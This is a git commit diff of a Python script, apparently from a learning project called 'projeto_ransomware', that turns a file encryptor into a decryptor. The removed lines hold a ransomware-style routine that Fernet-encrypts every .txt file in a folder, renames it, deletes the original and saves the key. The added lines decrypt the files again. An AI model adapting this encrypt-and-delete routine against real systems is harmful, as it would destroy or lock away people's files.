4cd54d064ba8e86f819e6a5edc35e31c987c2951
5ons0n <94926282+5ons0n@users.noreply.github.com>
2025-01-31 19:46:55 -0300

    Update decrypter.py

--- decrypter.py
+++ decrypter.py
@@ -1,33 +1,30 @@
 import os
 from cryptography.fernet import Fernet
 
-# Gerar uma chave de criptografia
-key = Fernet.generate_key()
-cipher_suite = Fernet(key)
-
-# Pasta onde os arquivos .txt estão localizados
+# Pasta onde os arquivos criptografados estão localizados
 pasta = "projeto_ransomware"
 
-# Função para criptografar arquivos
-def criptografar_arquivos(pasta):
+# Carregar a chave de criptografia
+with open("chave_privada.key", "rb") as key_file:
+    key = key_file.read()
+cipher_suite = Fernet(key)
+
+# Função para descriptografar arquivos
+def descriptografar_arquivos(pasta):
     for root, dirs, files in os.walk(pasta):
         for file in files:
-            if file.endswith(".txt"):
+            if file.endswith("_private-root-win.txt"):
                 caminho_completo = os.path.join(root, file)
                 with open(caminho_completo, "rb") as f:
-                    dados = f.read()
-                dados_criptografados = cipher_suite.encrypt(dados)
-                novo_nome = file.replace(".txt", "_private-root-win.txt")
+                    dados_criptografados = f.read()
+                dados_descriptografados = cipher_suite.decrypt(dados_criptografados)
+                novo_nome = file.replace("_private-root-win.txt", ".txt")
                 novo_caminho = os.path.join(root, novo_nome)
                 with open(novo_caminho, "wb") as f:
-                    f.write(dados_criptografados)
+                    f.write(dados_descriptografados)
                 os.remove(caminho_completo)
 
-# Criptografar os arquivos na pasta
-criptografar_arquivos(pasta)
+# Descriptografar os arquivos na pasta
+descriptografar_arquivos(pasta)
 
-# Salvar a chave em um arquivo para uso posterior na descriptografia
-with open("chave_privada.key", "wb") as key_file:
-    key_file.write(key)
-
-print("Arquivos criptografados com sucesso!")
+print("Arquivos descriptografados com sucesso!")
